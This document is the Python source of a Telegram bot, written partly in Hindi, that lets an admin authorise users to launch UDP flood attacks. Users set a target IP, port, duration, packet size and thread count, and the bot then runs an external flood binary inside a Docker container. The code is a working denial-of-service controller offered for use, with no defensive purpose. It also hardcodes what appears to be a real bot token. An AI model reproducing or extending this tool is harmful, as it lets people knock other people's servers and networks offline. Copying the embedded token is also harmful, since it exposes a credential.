import os
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.types import ParseMode
from subprocess import Popen
import time

TOKEN = "7658787198:AAGarJHvbVhIMtjVCU4FW0ToSH_m1I8jb5k"
ADMIN_ID = 7855020275  # 🔥 **Yaha Apna Telegram ID Daalo!** 🔥

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

# **Users Store करने के लिए Dictionary**
users = {}
attack_threads = {}

# **Admin Only Commands**
@dp.message_handler(commands=['adduser'])
async def add_user(msg: types.Message):
    if msg.from_user.id == ADMIN_ID:
        try:
            user_id = int(msg.text.split(" ")[1])
            users[user_id] = {}
            await msg.answer(f"✅ **User Added:** `{user_id}`")
        except:
            await msg.answer("❌ **Usage:** `/adduser <USER_ID>`")
    else:
        await msg.answer("🚫 **You are not an Admin!**")

@dp.message_handler(commands=['removeuser'])
async def remove_user(msg: types.Message):
    if msg.from_user.id == ADMIN_ID:
        try:
            user_id = int(msg.text.split(" ")[1])
            if user_id in users:
                del users[user_id]
                await msg.answer(f"❌ **User Removed:** `{user_id}`")
            else:
                await msg.answer("❌ **User Not Found!**")
        except:
            await msg.answer("❌ **Usage:** `/removeuser <USER_ID>`")
    else:
        await msg.answer("🚫 **You are not an Admin!**")

# **User Commands**
@dp.message_handler(commands=['start'])
async def start_cmd(msg: types.Message):
    if msg.from_user.id in users:
        await msg.answer("🚀 **Hi Ram Bhakt 🚩**\n\n⚡ 𝙐𝘿𝙋 𝘼𝙩𝙩𝙖𝙘𝙠 𝙎𝙚𝙩𝙪𝙥 𝙠𝙖𝙧𝙤:\n1️⃣ `/setip 192.168.1.1`\n2️⃣ `/setport 21318`\n3️⃣ `/settime 120`\n4️⃣ `/setpacket 1024`\n5️⃣ `/setthreads 1000`\n6️⃣ `/attack`")
    else:
        await msg.answer("❌ **Access Denied! Admin से Permission लो!**")

@dp.message_handler(commands=['setip', 'setport', 'settime', 'setpacket', 'setthreads'])
async def set_params(msg: types.Message):
    if msg.from_user.id not in users:
        return await msg.answer("❌ **Access Denied!**")

    param = msg.text.split(" ")[0][5:]
    value = msg.text.split(" ")[1] if len(msg.text.split()) > 1 else None

    if value:
        users[msg.from_user.id][param] = value
        await msg.answer(f"✅ **{param.capitalize()} सेट:** `{value}`")
    else:
        await msg.answer(f"❌ **Usage:** `/{param} <VALUE>`")

@dp.message_handler(commands=['attack'])
async def attack_cmd(msg: types.Message):
    if msg.from_user.id not in users:
        return await msg.answer("❌ **Access Denied!**")

    params = users[msg.from_user.id]
    ip, port, time_sec, packet, threads = params.get("ip"), params.get("port"), params.get("time", "600"), params.get("packet", "1024"), params.get("threads", "1000")

    if ip and port:
        await msg.answer(f"🔥 **𝙐𝘿𝙋 𝘼𝙩𝙩𝙖𝙘𝙠 𝙎𝙩𝙖𝙧𝙩𝙚𝙙!**\n\n🎯 Target: `{ip}:{port}`\n🕒 Time: `{time_sec} sec`\n📦 Packet: `{packet} bytes`\n⚙️ Threads: `{threads}`")

        def attack_thread():
            Popen(["docker", "exec", "udp_container", "./raja", ip, port, time_sec, packet, threads])
            time.sleep(int(time_sec))
            asyncio.run(bot.send_message(msg.from_user.id, "🔥 **𝘼𝙩𝙩𝙖𝙘𝙠 𝙁𝙞𝙣𝙞𝙨𝙝𝙚𝙙!** 😈"))

        attack_threads[msg.from_user.id] = asyncio.create_task(asyncio.to_thread(attack_thread))

    else:
        await msg.answer("❌ **IP और Port सेट करो पहले!**")

@dp.message_handler(commands=['stop'])
async def stop_cmd(msg: types.Message):
    if msg.from_user.id in attack_threads:
        attack_threads[msg.from_user.id].cancel()
        del attack_threads[msg.from_user.id]
        os.system("docker stop udp_container")
        await msg.answer("❌ **𝙐𝘿𝙋 𝘼𝙩𝙩𝙖𝙘𝙠 𝙎𝙩𝙤𝙥𝙥𝙚𝙙!** 🚦")

if __name__ == "__main__":
    from aiogram import executor
    executor.start_polling(dp)
